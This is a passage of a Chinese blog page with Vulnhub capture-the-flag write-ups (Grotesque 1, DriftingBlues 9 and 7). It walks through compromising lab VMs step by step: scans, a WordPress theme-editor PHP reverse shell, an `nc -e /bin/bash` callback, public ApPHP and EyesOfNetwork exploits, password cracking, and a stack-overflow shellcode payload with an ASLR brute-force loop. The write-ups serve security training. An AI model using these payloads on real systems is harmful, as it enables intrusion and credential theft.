-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sP 192.168.56.0/24，扫描靶机ip</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/13/Grotesque-1/3.png" alt="image-"></p>
-<p>2.再进行端口扫描，发现只开放了66和80端口，而主页并没有东西：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -T4 -sC -sV -p- --min-rate=1000 192.168.56.108 | tee nmapscan，端口扫描</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/13/Grotesque-1/4.png" alt="image-"></p>
-<p><img src="/2022/06/13/Grotesque-1/5.png" alt="image-"></p>
-<p>3.最后再进行一下目录扫描，发现只有&#x2F;javascript，也无法直接查看：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster dir -u http://192.168.56.108/ -x html,php,bak,txt --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt，目录扫描</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/13/Grotesque-1/6.png" alt="image-"></p>
-</blockquote>
-<h3><span id="端口指向发现">端口指向发现</span></h3><blockquote>
-<p>1.访问一下192.168.56.108:66页面，vvmlist.github.io，页面提示我们去下载这个项目，而在源码我们发现了一组很像brainfuck编码的注释：</p>
-<p><img src="/2022/06/13/Grotesque-1/7.png" alt="image-"></p>
-<p>2.brainfuck解码出来指向&#x2F;sshpasswd.png，同时我们下载下vvmlist这个项目，解压后很快就能发现这张图片：</p>
-<p><img src="/2022/06/13/Grotesque-1/8.png" alt="image-"></p>
-<p><img src="/2022/06/13/Grotesque-1/9.png" alt="image-"></p>
-<p>3.利用多种工具分析sshpasswd.png没有分析出来，但靶机也没有开放22端口无法ssh登录，所以转向查看vvmlist中的其他文件，按照操作时间，我们可以发现80端口真正的指向，而且很可能是使用wordpress搭建的：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat _vvmlist/* | sort | uniq</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/13/Grotesque-1/10.png" alt="image-"></p>
-<p><img src="/2022/06/13/Grotesque-1/11.png" alt="image-"></p>
-</blockquote>
-<h3><span id="wordpress后台登录">Wordpress后台登录</span></h3><blockquote>
-<p>1.访问192.168.56.108&#x2F;lyricsblog，查看源码，我们会发现一张图片地址，查看图片，没有太多线索：</p>
-<p><img src="/2022/06/13/Grotesque-1/12.png" alt="image-"></p>
-<p><img src="/2022/06/13/Grotesque-1/13.png" alt="image-"></p>
-<p>2.前面提到了这个页面是wordpress搭建的，我们使用wpscan扫描一下，也没有太多发现：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url http://grotesqueip/lyricsblog -e ap,cb,dbe,u1-999 --plugins-detection aggressive --plugins-version-detection aggressive</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/13/Grotesque-1/14.png" alt="image-"></p>
-<p>3.说句实话，思路到这里就断掉了，后来通过维基，发现&#x2F;lyricsblog页都是歌曲的歌词，然后yesman.png又提示他喜欢听hakan-tasiyan-doktor，我们尝试把这首歌的歌词全部获取下来md5然后大写一下，发现就是可以登录wordpress后台的密码，用户名是erdalkomurcu，页面有显示：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">vim doctor-lyrics.txt，写入歌词</span><br><span class="line">md5sum doctor-lyrics.txt</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/13/Grotesque-1/15.png" alt="image-"></p>
-<p><img src="/2022/06/13/Grotesque-1/16.png" alt="image-"></p>
-<p>4.访问192.168.56.108&#x2F;lyricsblog&#x2F;wp-admin，提示密码要大写，我们登录看看：</p>
-<p><img src="/2022/06/13/Grotesque-1/17.png" alt="image-"></p>
-<p><img src="/2022/06/13/Grotesque-1/18.png" alt="image-"></p>
-</blockquote>
-<h3><span id="wordpress后台写入webshell准备提权">Wordpress后台写入webshell，准备提权</span></h3><blockquote>
-<p>1.在wordpress后台Appearance页Theme Editor，在404.php（my favorite）内粘贴kali自带的webshell，&#x2F;usr&#x2F;share&#x2F;webshells&#x2F;php&#x2F;php-reverse-shell.php，并在kali开启对应端口监听，通过访问<br><a target="_blank" rel="noopener" href="http://192.168.56.108/lyricsblog/index.php/author/erdalkomurcu/1%E8%A7%A6%E5%8F%91webshell%EF%BC%9A">http://192.168.56.108/lyricsblog/index.php/author/erdalkomurcu/1触发webshell：</a></p>
-<p><img src="/2022/06/13/Grotesque-1/19.png" alt="image-"></p>
-<p><img src="/2022/06/13/Grotesque-1/20.png" alt="image-"></p>
-<p>2.通过查看&#x2F;var&#x2F;www&#x2F;html&#x2F;lyricsblog&#x2F;wp-config.php，能够得到raphael用户及密码，登录一下试试：</p>
-<p><img src="/2022/06/13/Grotesque-1/21.png" alt="image-"></p>
-<p><img src="/2022/06/13/Grotesque-1/22.png" alt="image-"></p>
-<p>3.用python建立一个交互式shell，可以发现user.txt是一串类似md5值，但是解不出来；在发现有一个.kdbx文件，应该是root的密钥库文件，获取到kali：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/13/Grotesque-1/23.png" alt="image-"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server 8001</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/13/Grotesque-1/24.png" alt="image-"></p>
-<p><img src="/2022/06/13/Grotesque-1/25.png" alt="image-"></p>
-<p>4.对.chadroot.kdbx使用keepass2john进行解密，这里要用到rockyou.txt，下载地址为<a target="_blank" rel="noopener" href="https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt%EF%BC%9A">https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt：</a></p>
-<p><img src="/2022/06/13/Grotesque-1/26.png" alt="image-"></p>
-<p><img src="/2022/06/13/Grotesque-1/27.png" alt="image-"></p>
-</blockquote>
-<h3><span id="root提权">root提权</span></h3><blockquote>
-<p>1.获取到密码，利用app.keeweb.info，上传chadroot.kdbx，可以获得root密码:</p>
-<p><img src="/2022/06/13/Grotesque-1/28.png" alt="image-"></p>
-<p>2.在&#x2F;root页下获得flag，即root.txt:</p>
-<p><img src="/2022/06/13/Grotesque-1/29.png" alt="image-"></p>
-</blockquote>
-
-
-        
-
-        
-            <div class="tags">
-                <a class="tag-none-link" href="/tags/Grotesque/" rel="tag">Grotesque</a><a class="tag-none-link" href="/tags/Vulnhub/" rel="tag">Vulnhub</a><a class="tag-none-link" href="/tags/WriteUp/" rel="tag">WriteUp</a>
-            </div>
-        
-
-    </section>
-</article>
-  
-    <article class="post ">
-
-    
-        <h2 class="title">
-            <a href="/2022/06/06/Driftingblues-9/">
-                Driftingblues 9
-            </a>
-        </h2>
-    
-    <time>
-        Jun 6, 2022
-    </time>
-    <section class="content">
-        <h1><span id="driftingblues9">Driftingblues:9</span></h1><h2><span id="一-基本信息">一、基本信息</span></h2><blockquote>
-<h4><span id="名称driftingblues9final">名称：DriftingBlues:9(final)</span></h4><h4><span id="发布日期202159">发布日期：2021.5.9</span></h4><h4><span id="作者tasiyanci">作者：tasiyanci</span></h4><h4><span id="系列driftingblues">系列：DriftingBlues</span></h4><h4><span id="推特tasiyanci">推特：@tasiyanci</span></h4></blockquote>
-<h2><span id="二-靶机简介">二、靶机简介</span></h2><blockquote>
-<h4><span id="flags">Flags：</span></h4><p>root:&#x2F;root&#x2F;root.txt </p>
-<h4><span id="难度困难">难度：困难</span></h4></blockquote>
-<h2><span id="三-文件信息">三、文件信息</span></h2><blockquote>
-<h4><span id="文件名driftingblues9ova">文件名：driftingblues9.ova</span></h4><h4><span id="文件大小738mb">文件大小：738MB</span></h4><h4><span id="下载地址httpscybersecs3cn-north-1amazonawscomcnimagedriftingbluesdriftingblues9ova">下载地址：</span></h4><h4><span id="md5-db7d1b48224f802666b07693acd7cdb4">MD5: DB7D1B48224F802666B07693ACD7CDB4</span></h4><h4><span id="sha1-cd8c690150b48ac4ab9e6a3d56a4f12f110c78c1">SHA1: CD8C690150B48AC4AB9E6A3D56A4F12F110C78C1</span></h4></blockquote>
-<h2><span id="四-镜像信息">四、镜像信息</span></h2><blockquote>
-<h4><span id="格式virtual-machine-virtualbox-ova">格式：Virtual Machine (Virtualbox - OVA)</span></h4><h4><span id="操作系统linuxdebain">操作系统：Linux(debain)</span></h4></blockquote>
-<h2><span id="五-网络信息">五、网络信息</span></h2><blockquote>
-<h4><span id="dhcp服务可用">DHCP服务：可用</span></h4><h4><span id="ip地址自动分配">IP地址：自动分配</span></h4></blockquote>
-<h2><span id="六-环境配置">六、环境配置</span></h2><blockquote>
-<p>1.将靶机driftingblues9和攻击机kali2021在VirtualBox下设置为仅主机模式，使用DHCP分配ip地址：</p>
-<p><img src="/2022/06/06/Driftingblues-9/1.png" alt="image-"></p>
-</blockquote>
-<h2><span id="七-攻略步骤">七、攻略步骤</span></h2><h3><span id="信息探测">信息探测</span></h3><blockquote>
-<p>1.因为是没有直接告知我们靶机ip的，所以要先进行主机探测，先查看下kali分配到的ip，在进行网段扫描，命令如下，得到靶机ip为192.168.56.102：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ifconfig，查看kali分配到的ip</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/06/Driftingblues-9/2.png" alt="image-"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sP 192.168.56.0/24，扫描靶机ip</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/06/Driftingblues-9/3.png" alt="image-"></p>
-<p>2.再进行端口扫描，发现开放了80和111端口，访问主页查看源码，发现是一个ApPHP页面：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -T4 -sC -sV -p- --min-rate=1000 192.168.56.120 | tee nmapscan，端口扫描</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/06/Driftingblues-9/4.png" alt="image-"></p>
-<p><img src="/2022/06/06/Driftingblues-9/5.png" alt="image-"></p>
-<p>3.最后再进行一下目录扫描，发现好些目录，但也没有进一步有价值的信息：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster dir -u http://192.168.56.120 -x html,php,bak,txt --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt，目录扫描</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/06/Driftingblues-9/6.png" alt="image-"></p>
-</blockquote>
-<h3><span id="apphp漏洞利用">ApPHP漏洞利用</span></h3><blockquote>
-<p>1.在主页面能够发现一个admin登录页面：</p>
-<p><img src="/2022/06/06/Driftingblues-9/7.png" alt="image-"></p>
-<p>2.因为源码提示了我们ApPHP的相关信息，我们可以去Exploit-db(<a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/33070)%E6%9F%A5%E6%89%BE%E5%88%B0%E7%9B%B8%E5%85%B3%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%EF%BC%9A">https://www.exploit-db.com/exploits/33070)查找到相关漏洞利用：</a></p>
-<p><img src="/2022/06/06/Driftingblues-9/8.png" alt="image-"></p>
-<p>3.执行相关python程序，我们可以获得较基础的权限：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python 33070.py http://192.168.56.120</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/06/Driftingblues-9/9.png" alt="image-"></p>
-</blockquote>
-<h3><span id="初步提权">初步提权</span></h3><blockquote>
-<p>1.利用得到的用户我们可以查看&#x2F;var&#x2F;www&#x2F;include&#x2F;base.inc.php文件下，有clapton用户及其密码，其实上面程序已经爆出来了：</p>
-<p><img src="/2022/06/06/Driftingblues-9/10.png" alt="image-"></p>
-<p>2.此时我们要先想办法建立交互式shell，先在kali开启端口监听，再利用靶机端返回shell：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 4444，kali开启端口监听</span><br><span class="line">which nc，靶机返回shell</span><br><span class="line">nc 192.168.56.102 4444 -e /bin/bash</span><br><span class="line">python -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;);&#x27;，kali再使用python建立交互式shell</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/06/Driftingblues-9/11.png" alt="image-"></p>
-<p><img src="/2022/06/06/Driftingblues-9/12.png" alt="image-"></p>
-<p>3.现在我们可以先确认clapton用户的存在，再进行登录了：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/passwd，确认存在clapton</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/06/Driftingblues-9/13.png" alt="image-"></p>
-<p><img src="/2022/06/06/Driftingblues-9/14.png" alt="image-"></p>
-</blockquote>
-<h3><span id="缓冲区溢出利用">缓冲区溢出利用</span></h3><blockquote>
-<p>1.在clapton用户目录下，我们能发现第一个flag，user.txt，而另一个note.txt文件查看后是关于缓冲区溢出的提示：</p>
-<p><img src="/2022/06/06/Driftingblues-9/15.png" alt="image-"></p>
-<p>2.除了两个txt文本文件以外，还有一个input文件，这个文件用file命令查看后，明显是要对这个文件进行缓冲区溢出提权：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file input</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/06/Driftingblues-9/16.png" alt="image-"></p>
-<p>3.我们将input文件获取到本地，用checksec查看，该文件并没有启用任何保护措施：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python -m SimpleHTTPServer 8001，clapton开启http服务（尝试使用了python3 -m http.server 8001，发现靶机没有python3）</span><br><span class="line">wget http://192.168.56.120:8001/input，kali获取input</span><br><span class="line">checksec --file=input</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/06/Driftingblues-9/17.png" alt="image-"></p>
-<p>4.使用命令修改input文件所有者，并赋予程序特殊权限：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo chown 0:0 input</span><br><span class="line">sudo chmod 4755 input</span><br><span class="line">ls -l</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/06/Driftingblues-9/18.png" alt="image-"></p>
-<p>5.使用cyclic生成500个字符组成的字符串用于计算偏移量：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python3</span><br><span class="line">from pwn import *</span><br><span class="line">cyclic(500)</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/06/Driftingblues-9/19.png" alt="image-"></p>
-<p>6.然后关闭kali的ASLR，启动gdb调试input程序，将500个字符组成的字符串传入程序并运行后程序奔溃，EIP寄存器的值为“0x61617362”：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo sh -c &quot;echo 0 &gt; /proc/sys/kernel/randomize_va_space&quot;</span><br><span class="line">gdb input</span><br><span class="line"></span><br><span class="line">r aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaaelaaemaaenaaeoaaepaaeqaaeraaesaaetaaeuaaevaaewaaexaaeyaae</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/06/Driftingblues-9/20.png" alt="image-"></p>
-<p>7.再次利用cyclic计算偏移量得到171，那么payload构造为“171个A”+“jmp esp地址”+Shellcode：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cyclic_find(0x61617362)</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/06/Driftingblues-9/21.png" alt="image-"></p>
-<p>8.在kali使用edb-debugger，随便传入参数调试程序，运行程序后Ctrl+O寻找jmp esp指令地址：</p>
-<p><img src="/2022/06/06/Driftingblues-9/22.png" alt="image-"></p>
-<p><img src="/2022/06/06/Driftingblues-9/23.png" alt="image-"></p>
-<p>9.选择r-x权限下的第一个jmp esp地址，写入payload，在kali上可以成功获得root权限：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./input `python -c &quot;print &#x27;A&#x27;*171+&#x27;\x70\xbe\xe0\xf7&#x27;+&#x27;\x31\xc0\x89\xc3\xb0\x17\xcd\x80\x31\xd2\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x52\x53\x89\xe1\x8d\x42\x0b\xcd\x80&#x27;&quot;`</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/06/Driftingblues-9/24.png" alt="image-"></p>
-<p>10.但同样的payload在clapton用户上并不能起效，原因是靶机开启了ASLR而我们无权限关闭，且靶机的偏移地址是jmp esp相对libc基址的偏移地址，kali下的libc.so.6文件与靶机不同；所以这里我们采用循环绕过ASLR:</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">gdb ./input，在clapton上测定偏移地址</span><br><span class="line">run $(python -c &#x27;print &quot;A&quot; * 171 + &quot;B&quot; * 5 + &quot;\x90&quot; * 2000&#x27;)，在kali上我们已经测得程序溢出位置偏移量为171，clapton上也如此</span><br><span class="line">x/s $esp，得到jmp esp相对libc基址的偏移地址</span><br><span class="line">q y，退出gdb调试</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/06/Driftingblues-9/25.png" alt="image-"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">for i in &#123;1..10000&#125;; do (./input $(python -c &#x27;print &quot;A&quot; * 171 + &quot;\xe0\xd6\x9e\xbf&quot; + &quot;\x90&quot; * 2000 + &quot;\x31\xc9\xf7\xe1\x51\xbf\xd0\xd0\x8c\x97\xbe\xd0\x9d\x96\x91\xf7\xd7\xf7\xd6\x57\x56\x89\xe3\xb0\x0b\xcd\x80&quot;&#x27;)); done，循环绕过ASLR</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/06/Driftingblues-9/26.png" alt="image-"></p>
-</blockquote>
-<h3><span id="flag获取">Flag获取</span></h3><blockquote>
-<p>1.通过利用缓冲区溢出漏洞，我们成功提权到root，在&#x2F;root目录下能够找到flag，即root.txt：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd /root</span><br><span class="line">ls -la</span><br><span class="line">cat root.txt</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/06/Driftingblues-9/27.png" alt="image-"></p>
-</blockquote>
-
-
-        
-
-        
-            <div class="tags">
-                <a class="tag-none-link" href="/tags/Driftingblues/" rel="tag">Driftingblues</a><a class="tag-none-link" href="/tags/Vulnhub/" rel="tag">Vulnhub</a><a class="tag-none-link" href="/tags/WriteUp/" rel="tag">WriteUp</a>
-            </div>
-        
-
-    </section>
-</article>
-  
-    <article class="post ">
-
-    
-        <h2 class="title">
-            <a href="/2022/06/06/Driftingblues-7/">
-                Driftingblues 7
-            </a>
-        </h2>
-    
-    <time>
-        Jun 6, 2022
-    </time>
-    <section class="content">
-        <h1><span id="driftingblues7">Driftingblues:7</span></h1><h2><span id="一-基本信息">一、基本信息</span></h2><blockquote>
-<h4><span id="名称driftingblues7">名称：DriftingBlues:7</span></h4><h4><span id="发布日期2021421">发布日期：2021.4.21</span></h4><h4><span id="作者tasiyanci">作者：tasiyanci</span></h4><h4><span id="系列driftingblues">系列：DriftingBlues</span></h4><h4><span id="推特tasiyanci">推特：@tasiyanci</span></h4></blockquote>
-<h2><span id="二-靶机简介">二、靶机简介</span></h2><blockquote>
-<h4><span id="flags">Flags：</span></h4><p>root:&#x2F;root&#x2F;flag.txt </p>
-<h4><span id="难度中等">难度：中等</span></h4></blockquote>
-<h2><span id="三-文件信息">三、文件信息</span></h2><blockquote>
-<h4><span id="文件名driftingblues7_vhova">文件名：driftingblues7_vh.ova</span></h4><h4><span id="文件大小13gb">文件大小：1.3GB</span></h4><h4><span id="下载地址httpscybersecs3cn-north-1amazonawscomcnimagedriftingbluesdriftingblues7_vhova">下载地址：</span></h4><h4><span id="md5-db16d916b288f8a6440d17046ee99064">MD5: DB16D916B288F8A6440D17046EE99064</span></h4><h4><span id="sha1-39824d3eb1d8da9118a12463b19503d93903b038">SHA1: 39824D3EB1D8DA9118A12463B19503D93903B038</span></h4></blockquote>
-<h2><span id="四-镜像信息">四、镜像信息</span></h2><blockquote>
-<h4><span id="格式virtual-machine-virtualbox-ova">格式：Virtual Machine (Virtualbox - OVA)</span></h4><h4><span id="操作系统linuxcentos">操作系统：Linux(centos)</span></h4></blockquote>
-<h2><span id="五-网络信息">五、网络信息</span></h2><blockquote>
-<h4><span id="dhcp服务可用">DHCP服务：可用</span></h4><h4><span id="ip地址自动分配">IP地址：自动分配</span></h4></blockquote>
-<h2><span id="六-环境配置">六、环境配置</span></h2><blockquote>
-<p>1.将靶机driftingblues7和攻击机kali2021在VirtualBox下设置为仅主机模式，使用DHCP分配ip地址：</p>
-<p><img src="/2022/06/06/Driftingblues-7/1.png" alt="image-"></p>
-</blockquote>
-<h2><span id="七-攻略步骤">七、攻略步骤</span></h2><h3><span id="信息探测">信息探测</span></h3><blockquote>
-<p>1.因为是没有直接告知我们靶机ip的，所以要先进行主机探测，先查看下kali分配到的ip，在进行网段扫描，命令如下，得到靶机ip为192.168.56.102：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ifconfig，查看kali分配到的ip</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/06/Driftingblues-7/2.png" alt="image-"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sP 192.168.56.0/24，扫描靶机ip</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/06/Driftingblues-7/3.png" alt="image-"></p>
-<p>2.再进行端口扫描，发现很多端口都是开放的，访问主页查看源码，发现是一个EyesOfNetwork的登录页：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -T4 -sC -sV -p- --min-rate=1000 192.168.56.119 | tee nmapscan，端口扫描</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/06/Driftingblues-7/4.png" alt="image-"></p>
-<p><img src="/2022/06/06/Driftingblues-7/5.png" alt="image-"></p>
-<p>3.最后再进行一下目录扫描，爆出的目录我们都无法访问，必须要先登录：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirb https://192.168.56.119，目录扫描</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/06/Driftingblues-7/6.png" alt="image-"></p>
-</blockquote>
-<h3><span id="eyesofnetwork登录">EyesOfNetwork登录</span></h3><blockquote>
-<p>1.因为开放了多个端口，我们逐一进行访问，访问192.168.56.119:66，源码内没有过多线索：</p>
-<p><img src="/2022/06/06/Driftingblues-7/7.png" alt="image-"></p>
-<p>2.我们对66端口下的目录再次进行扫描，直接扫出了一个flag.txt文件：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster dir -u http://192.168.56.119:66 -x html,php,bak,txt --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt，对66端口下目录扫描</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/06/Driftingblues-7/8.png" alt="image-"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://192.168.56.119:66/flag.txt</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/06/Driftingblues-7/9.png" alt="image-"></p>
-<p>3.这个应该是作者忘记删除的flag文件了，其实应该是想让我们发现eon这个文件：</p>
-<p><img src="/2022/06/06/Driftingblues-7/10.png" alt="image-"></p>
-<p>4.查看eno文件，发现是一串base64编码，解码后发现格式是压缩文件的格式，于是把它解码为application.zip（这里用到了这个在线工具：<a target="_blank" rel="noopener" href="https://base64.guru/converter/decode/file%EF%BC%89%EF%BC%9A">https://base64.guru/converter/decode/file）：</a></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://192.168.56.119:66/eon</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/06/Driftingblues-7/11.png" alt="image-"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo UEsDBBQAAQAAAAOfg1LxSVvWHwAAABMAAAAJAAAAY3JlZHMudHh093OsvnCY1d4tLCZqMvRD+ZUURw+5YmOf9bS11scvmFBLAQI/ABQAAQAAAAOfg1LxSVvWHwAAABMAAAAJACQAAAAAAAAAIAAAAAAAAABjcmVkcy50eHQKACAAAAAAAAEAGABssaU7qijXAYPcazaqKNcBg9xrNqoo1wFQSwUGAAAAAAEAAQBbAAAARgAAAAAA | base64 -d</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/06/Driftingblues-7/12.png" alt="image-"></p>
-<p><img src="/2022/06/06/Driftingblues-7/13.png" alt="image-"></p>
-<p>5.利用zip2john对application.zip进行解密，再用john得到密码，查看creds.txt获得用户和密码：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">zip2john application.zip | tee hash</span><br><span class="line">john hash --wordlist=/home/kali/Desktop/rockyou.txt</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/06/Driftingblues-7/14.png" alt="image-"></p>
-<p><img src="/2022/06/06/Driftingblues-7/15.png" alt="image-"></p>
-</blockquote>
-<h3><span id="eyesofnetwork版本漏洞利用">EyesOfNetwork版本漏洞利用</span></h3><blockquote>
-<p>1.利用得到的用户和密码登录EyesOfNetwork后台，发现在Help-EyesOfNetwork页可以发现EyesOfNetwork的版本为5.3：</p>
-<p><img src="/2022/06/06/Driftingblues-7/16.png" alt="image-"></p>
-<p>2.可以找到这个版本的漏洞利用文件，<a target="_blank" rel="noopener" href="https://github.com/h4knet/eonrce/blob/master/eonrce.py%EF%BC%8C%E8%8E%B7%E5%8F%96%E4%B8%8B%E6%9D%A5%E5%8F%AF%E4%BB%A5%E7%9B%B4%E6%8E%A5%E5%88%A9%E7%94%A8%EF%BC%9A">https://github.com/h4knet/eonrce/blob/master/eonrce.py，获取下来可以直接利用：</a></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wget https://raw.githubusercontent.com/h4knet/eonrce/master/eonrce.py</span><br><span class="line">chmod +x eonrce.py</span><br><span class="line">./eonrce.py https://192.168.3.146/ -ip 192.168.3.145 -port 4444，这里要改一下靶机和kali的网络链接方式，改为桥接模式，命令执行的是桥接模式的ip</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/06/Driftingblues-7/17.png" alt="image-"></p>
-</blockquote>
-<h3><span id="flag获取">Flag获取</span></h3><blockquote>
-<p>1.现在我们可以在&#x2F;root目录下，能够找到flag，即flag.txt：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd /root</span><br><span class="line">ls -la</span><br><span class="line">cat flag.txt</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/06/Driftingblues-7/18.png" alt="image-"></p>
-</blockquote>
-
-
-        
-
-        
